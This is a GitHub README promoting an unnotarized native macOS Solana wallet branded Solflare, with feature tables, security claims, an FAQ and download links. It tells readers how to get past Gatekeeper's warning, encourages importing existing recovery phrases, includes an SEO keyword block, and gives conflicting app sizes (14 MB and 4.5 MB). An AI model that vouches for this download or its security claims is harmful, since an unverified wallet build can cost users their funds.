<!--
  GitHub About settings
  Description: Native macOS wallet for Solana: SwiftUI, self-custodial, Touch ID, Keychain, App Sandbox.
  Topics: solana, solana-wallet, crypto-wallet, macos, swiftui, swift, self-custody, keychain, touch-id, bip39, defi, desktop-app
-->

<div align="center">

# Solflare for macOS

### A native Solana wallet, built for the Mac.
**Fast. Self-custodial. Deeply integrated with macOS.**

[![Platform](https://img.shields.io/badge/macOS-14%2B-000000?logo=apple&logoColor=white)](#system-requirements)
[![Built with](https://img.shields.io/badge/SwiftUI-native-F05138?logo=swift&logoColor=white)](#technical-overview)
[![Architecture](https://img.shields.io/badge/Apple%20Silicon%20%2B%20Intel-universal-FFEF46)](#system-requirements)
[![Custody](https://img.shields.io/badge/self--custodial-keys%20never%20leave%20your%20Mac-2EA44F)](#security-first)

<br>

**[⬇️ Download for macOS (.dmg)](https://github.com/Solflare-macos/solflare-wallet-macos/releases/latest/download/Solflare-macOS.dmg)**
&nbsp;·&nbsp;
[Install](#install-in-two-minutes)
&nbsp;·&nbsp;
[Security](#security-first)
&nbsp;·&nbsp;
[Technical overview](#technical-overview)

<br>

<img src="https://github.com/Solflare-macos/solflare-wallet-macos/releases/download/v1.0.0/02-portfolio.png" alt="Solflare for macOS: the Portfolio screen" width="860">

</div>

---

## Why a native app

Browser wallets live in a tab, next to dozens of extensions and scripts. **Solflare for macOS** is a standalone app: one process, one window, and your keys behind the system's own isolation.

| | |
|---|---|
| ⚡ **Native performance** | Written in SwiftUI with no web engine and no Electron. Launches in seconds, weighs about 14 MB, and is easy on your battery. |
| 🔐 **Stronger security** | Your recovery phrase lives in the macOS Keychain and opens only with Touch ID or your Mac password. The private key is never written anywhere. |
| 🍎 **Built for macOS** | Touch ID, Keychain, App Sandbox, dark appearance, keyboard shortcuts, and automatic locking when your Mac sleeps or the screen locks. |

---

## Features

<p align="center">
  <img src="https://github.com/Solflare-macos/solflare-wallet-macos/releases/download/v1.0.0/03-assets.png" alt="Assets: total value and token list" width="820"><br>
  <sub>Assets: total value, price and 24-hour change, and one-click Send and Deposit</sub>
</p>

| What you get | How it works for you |
|---|---|
| **Self-custody, for real** | Your keys never leave your Mac: no account, no project servers, nothing on the other side to breach. |
| **Industry-standard recovery phrase** | A 12- or 24-word BIP-39 phrase with the same derivation path Solflare and Phantom use. Import an existing wallet in under a minute. |
| **macOS App Sandbox** | The app runs in the macOS sandbox: it can't see your documents, photos, or other apps, and its only outside access is the network. |
| **Send SOL and SPL tokens** | Review the fee, approve with Touch ID, watch the confirmation, and open the transaction in an explorer. Large amounts add an extra address check. |
| **Markets and portfolio** | Balance, 24-hour change, markets with market cap, liquidity, and holder filters, sortable columns, and token icons. |
| **Transaction details** | Open any transaction in a side panel: amounts, status, full addresses, network fee, and signature. |
| **Custom RPC and test networks** | Connect your own node (Helius, QuickNode, and others) with cluster verification, and switch between Mainnet, Devnet, and Testnet. |
| **Address book and allowlist** | Save recipients and restrict transfers to addresses you trust. |
| **Privacy controls** | Hide balances with one switch or on every launch, clear local data, and copy diagnostics that contain no secrets. |

<table>
  <tr>
    <td width="50%" align="center">
      <img src="https://github.com/Solflare-macos/solflare-wallet-macos/releases/download/v1.0.0/04-markets.png" alt="Markets with token icons and filters"><br>
      <sub><b>Markets</b>: sortable columns and filters</sub>
    </td>
    <td width="50%" align="center">
      <img src="https://github.com/Solflare-macos/solflare-wallet-macos/releases/download/v1.0.0/11-dropdown.png" alt="A filter menu with explanations"><br>
      <sub><b>Filters</b> open as a menu with explanations</sub>
    </td>
  </tr>
  <tr>
    <td width="50%" align="center">
      <img src="https://github.com/Solflare-macos/solflare-wallet-macos/releases/download/v1.0.0/05-activity.png" alt="Activity history"><br>
      <sub><b>Activity</b>: your whole history in one list</sub>
    </td>
    <td width="50%" align="center">
      <img src="https://github.com/Solflare-macos/solflare-wallet-macos/releases/download/v1.0.0/06-transaction.png" alt="Transaction details in a side panel"><br>
      <sub><b>Transaction</b>: amounts, status, addresses, fee, signature</sub>
    </td>
  </tr>
  <tr>
    <td width="50%" align="center">
      <img src="https://github.com/Solflare-macos/solflare-wallet-macos/releases/download/v1.0.0/07-send.png" alt="Send: choosing an asset"><br>
      <sub><b>Send</b>: pick an asset with icons and balances</sub>
    </td>
    <td width="50%" align="center">
      <img src="https://github.com/Solflare-macos/solflare-wallet-macos/releases/download/v1.0.0/08-review.png" alt="Transfer review with address confirmation"><br>
      <sub><b>Review</b>: fee, full address, retype check for large amounts</sub>
    </td>
  </tr>
</table>

---

## Security first

A wallet isn't an interface, it's a responsibility. That's why security here is architecture, not an option.

<table>
  <tr>
    <td width="50%" align="center">
      <img src="https://github.com/Solflare-macos/solflare-wallet-macos/releases/download/v1.0.0/09-security.png" alt="Security and privacy settings"><br>
      <sub><b>Security &amp; Privacy</b>: app lock, recovery phrase, hidden balances</sub>
    </td>
    <td width="50%" align="center">
      <img src="https://github.com/Solflare-macos/solflare-wallet-macos/releases/download/v1.0.0/10-lock.png" alt="Lock screen"><br>
      <sub><b>Lock screen</b>: Touch ID or your Mac password</sub>
    </td>
  </tr>
</table>

### Self-custodial by design
The app has no server component. Your recovery phrase is created and stored only on your device. Nobody working on this project can reach your funds, and if you lose the phrase it cannot be recovered, so keep it offline.

### Keychain encryption
The phrase is stored in the macOS Keychain with `ThisDeviceOnly` access: it doesn't sync to iCloud and is unavailable while your Mac is locked. The private key is **never stored at all**. It is derived from the phrase for a fraction of a second at signing time and then discarded.

### Touch ID and your Mac password
System-level owner verification (`LocalAuthentication`) is required to:

- sign and send a transfer;
- reveal the recovery phrase;
- change the app lock setting;
- unlock the app after it locks.

Touch ID is optional. You can always approve with your account password.

### Locking and screen protection
- **App lock**: on launch, or after 1 min / 5 min / 15 min / 1 hour of inactivity.
- Automatic lock when your **Mac sleeps or the screen locks**, and `⌘L` to lock manually.
- While the recovery phrase is on screen, the window is **excluded from screen recording and screenshots**, and the phrase hides itself after a minute.
- Anything you copy from the phrase screen is cleared from the clipboard automatically.

### Protection against mistakes and spoofing
The full recipient address is shown on the review screen, large transfers require retyping the end of the address, and the recipient's token account is checked so tokens can't be sent into the void.

> **Honest about the limits.** App lock protects the interface; it does not replace protecting your macOS account itself. The project has **not been independently audited**, and no real mainnet transfers were broadcast during development. Make your first transfer a minimal amount.

---

## How it works

```
Your Mac                                                       Network (read data, submit signed transactions)
┌──────────────────────────────────────────────────────┐      ┌───────────────────────────┐
│  SwiftUI interface                                   │      │  Solana RPC               │
│        │                                             │      │  (public or your own)     │
│  AppModel: state and actions                         │      ├───────────────────────────┤
│        │                                             │ ───▶ │  Jupiter: tokens, prices  │
│  WalletService ──▶ SolflareCore                      │      │  CoinGecko: fiat rates    │
│        │            BIP-39 · SLIP-0010 · Ed25519     │      └───────────────────────────┘
│  Keychain (phrase) ◀─ key exists only while          │
│  Touch ID / password   signing                       │      Private keys and the phrase
└──────────────────────────────────────────────────────┘      never leave the device
```

<p align="center">
  <img src="https://github.com/Solflare-macos/solflare-wallet-macos/releases/download/v1.0.0/01-welcome.png" alt="First launch: create or import a wallet" width="760"><br>
  <sub>First launch: create a wallet or import an existing one</sub>
</p>

1. **Create or import.** You get 12 words (or enter your own). The app validates the checksum and derives your address.
2. **Store.** The phrase goes into the Keychain and is never written to disk in plain text.
3. **Use.** Balances, prices, and history load from open sources using your public address only.
4. **Sign.** When you send, Touch ID confirms it's you, the key is derived for an instant, and the transaction is signed locally and submitted already signed.

---

## Install in two minutes

### System requirements

| | Minimum |
|---|---|
| macOS | **14.0 Sonoma** or later |
| Mac | MacBook Air and Pro 2018+, Mac mini 2018+, iMac 2019+, Mac Studio, Mac Pro 2019+ (Apple Silicon and Intel) |
| Display | Effective resolution of 1440 × 900 or higher (the window is a fixed 1200 × 820) |
| Network | Internet connection |

### Steps

1. **Download** [`Solflare-macOS.dmg`](https://github.com/Solflare-macos/solflare-wallet-macos/releases/latest/download/Solflare-macOS.dmg) from the [Releases](https://github.com/Solflare-macos/solflare-wallet-macos/releases/latest) page.
2. **Verify the checksum.** It takes ten seconds and confirms the file wasn't altered:
   ```bash
   shasum -a 256 ~/Downloads/Solflare-macOS.dmg
   ```
   The result must match the `SHA-256` value in the release notes.
3. **Open** the `.dmg` and drag **Solflare** into **Applications**.
4. **First launch**: see below.

### First launch: macOS confirmation

By default, macOS only runs apps notarized by Apple. This build is not notarized, so the system shows a warning that the app is from an **unidentified developer**. This is standard macOS protection, not a sign of a problem with the file, as long as the checksum matched.

The recommended way to open it without lowering your system's protection:

1. In Finder, open **Applications**, then right-click (or Control-click) **Solflare** and choose **Open**.
2. Click **Open** again in the dialog. From then on the app launches normally.
3. If **Open** isn't offered: **System Settings → Privacy & Security**, scroll down to the message about Solflare, and click **Open Anyway**.

> **Don't disable Gatekeeper system-wide**, and don't run commands that remove protection from your whole system. For a wallet, that's an unnecessary risk.

---

## Technical overview

How the app is built and what it does with your data.

### How it is built

```
Solflare for macOS
├── Solflare/                    the app (SwiftUI)
│   ├── App/                     entry point, window, router, state
│   ├── Features/                screens: onboarding, Portfolio, Assets, Markets, Activity, Settings, modals
│   ├── Services/                wallet, Keychain, network, caches, Touch ID
│   ├── DesignSystem/            palette, fonts, components, dropdowns
│   └── Domain/                  models and formatting
├── Packages/SolflareCore/       cryptography, RPC, transaction building and signing (no UI) + tests
└── Tools/                       independent reference implementation for tests
```

### Facts

| Question | Answer |
|---|---|
| Where is the phrase stored? | Only in the Keychain (`ThisDeviceOnly`). There are no files or logs containing it. |
| Where is the private key stored? | Nowhere: it's derived for the duration of signing (`SolanaSigner`) and never saved. |
| How is the address derived? | BIP-39 → PBKDF2-HMAC-SHA512 → SLIP-0010 ed25519, path `m/44'/501'/0'/0'`. |
| What goes over the network? | Your public address, price requests, and signed transactions. Never the phrase or keys. |
| Dependencies? | No third-party libraries: CryptoKit, CommonCrypto, Security, LocalAuthentication. |
| Tests? | 70 core tests: official BIP-39/SLIP-0010 vectors, an independent Python reference, and byte-for-byte comparison with real mainnet transactions. |
| Sandbox? | App Sandbox, entitlements: outgoing network only. |

### Known limitations

- There has been no independent security audit.
- Real mainnet transfers were not broadcast during development (simulation and reference comparison were used instead). Start with a minimal amount.
- Token-2022 tokens are shown, but sending them isn't supported yet; there are no priority fees or memos.
- One wallet account (`m/44'/501'/0'/0'`).
- The public RPC rate-limits requests: the first history load can take up to ~20 seconds. Your own node removes this limit.

## Frequently asked questions

### What is Solflare for macOS?
A native desktop Solana wallet for Mac. It stores your recovery phrase in the macOS Keychain, signs transactions locally, and lets you hold, send, and track SOL and SPL tokens without a browser extension.

### Is it a self-custodial Solana wallet?
Yes. Your recovery phrase and private keys stay on your Mac. There is no account and no server that can access your funds, so you alone are responsible for backing up your recovery phrase.

### Which Macs and macOS versions are supported?
macOS 14 Sonoma or later on Apple Silicon (M1 and newer) and Intel Macs from 2018 onward.

### Can I import my existing Solana wallet?
Yes. Import a 12- or 24-word BIP-39 recovery phrase. The wallet uses the standard Solana derivation path (`m/44'/501'/0'/0'`), so the address matches Solflare and Phantom.

### Does it support Touch ID?
Yes. Touch ID or your Mac password confirms sending funds, revealing your recovery phrase, and unlocking the app.

### Can I use my own RPC node or a test network?
Yes. Add your own Solana RPC endpoint and switch between Mainnet, Devnet, and Testnet in Settings.

### How do I open the app if macOS blocks it?
The build is not notarized by Apple. Right-click the app, choose **Open**, and confirm. Steps are in [Install in two minutes](#install-in-two-minutes).

---

<div align="center">

## Ready to try it?

# [⬇️ Download Solflare for macOS](https://github.com/Solflare-macos/solflare-wallet-macos/releases/latest/download/Solflare-macOS.dmg)

**`.dmg` · macOS 14+ · Apple Silicon and Intel · about 4.5 MB**

Your keys. Your Mac. Your control.

<sub>Cryptocurrency carries risk of loss. Keep your recovery phrase offline and never share it with anyone.</sub>

<sub>**Keywords:** Solana wallet for Mac, macOS crypto wallet, native Solana wallet, self-custodial wallet, SOL wallet, SPL token wallet, Solana desktop wallet, Touch ID crypto wallet, BIP-39 recovery phrase, Solana wallet app for macOS, non-custodial wallet, Solflare macOS, Apple Silicon wallet.</sub>

</div>
